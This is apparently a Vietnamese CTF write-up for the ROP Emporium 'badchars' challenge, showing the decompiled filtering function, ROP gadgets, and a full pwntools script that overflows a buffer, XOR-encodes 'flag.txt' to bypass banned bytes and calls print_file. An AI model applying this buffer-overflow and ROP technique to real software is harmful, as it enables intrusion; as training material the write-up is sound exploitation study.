# badchars - challenge 5

[binary file and my exploit code](https://github.com/Hjn4Pwn/Pwn/tree/main/ROP/chall5_badchars)

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall5_badchars$ file badchars
badchars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6c79e265b17cf6845beca7e17d6d8ac2ecb27556, not stripped
```

Bài này tương tự chall *write4* trước. Tuy nhiên có 1 một cái filter ở đây là: 

```c
int pwnme()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-40h]
  unsigned __int64 i; // [rsp+8h] [rbp-38h]
  unsigned __int64 j; // [rsp+10h] [rbp-30h]
  char v4[32]; // [rsp+20h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts("badchars by ROP Emporium");
  puts("x86_64\n");
  memset(v4, 0, sizeof(v4));
  puts("badchars are: 'x', 'g', 'a', '.'");
  printf("> ");
  v1 = read(0, v4, 0x200uLL);
  for ( i = 0LL; i < v1; ++i )
  {
    for ( j = 0LL; j <= 3; ++j )
    {
      if ( v4[i] == badcharacters[j] )
        v4[i] = -21;
    }
  }
  return puts("Thank you!");
}
```

Việt ghi **flag.txt** vào địa chỉ chỉ định giờ đây đã không còn đơn giản như ta nghĩ.

Mà chall này cũng cho vài cái hint để ta hướng đến việc thay vì ghi trực tiếp thì ta dùng phép **xor** trước khi ghi, và lại **xor** sau khi ghi thành công vào rồi và ***HOW???*** đương nhiên câu trả lời là *ROP gadget* :))

Ta có các gadget hữu ích sau:

```python
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret

0x0000000000400634 : mov qword ptr [r13], r12 ; ret
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

0x00000000004004ee : ret
```

Đầu tiên ta sẽ dùng **mov,pop r12,r13** để ghi chuỗi ta muốn vào địa chỉ chỉ định, chuỗi này là *flag.txt* đã được mang đi xor với *2* , địa chỉ chỉ định thì ta cũng tìm như chall **write4** 

Sau đấy thì ta sẽ pop sao cho r14 chứa *2* còn r15 sẽ chứa *địa chỉ chuỗi*, và tiến hành xor từng byte

### Exploit

```python
from pwn import *

r = process("./badchars")
#gdb.attach(r, api = True)

pop_r12_r13_r14_r15 = 0x000000000040069c
mov_r13add_r12 = 0x0000000000400634

pop_r14_r15 = 0x00000000004006a0
xor_r15add_r14 = 0x0000000000400628

ret = 0x00000000004004ee

address_flagtxt = 0x601040
pop_rdi = 0x00000000004006a3
print_file = 0x00400510

#bypass badchars
flag = (''.join(chr(ord(c) ^ 2) for c in "flag.txt")).encode('utf-8')

payload = b'A'*40 + p64(ret)

payload += p64(pop_r12_r13_r14_r15)
payload += flag + p64(address_flagtxt) + p64(1) + p64(1)
payload += p64(mov_r13add_r12)

for i in range(8):
    payload += p64(pop_r14_r15)
    payload += p64(2) + p64(address_flagtxt + i)
    payload += p64(xor_r15add_r14)

payload += p64(pop_rdi)
payload += p64(address_flagtxt)
payload += p64(print_file)


r.sendline(payload)
r.interactive()

```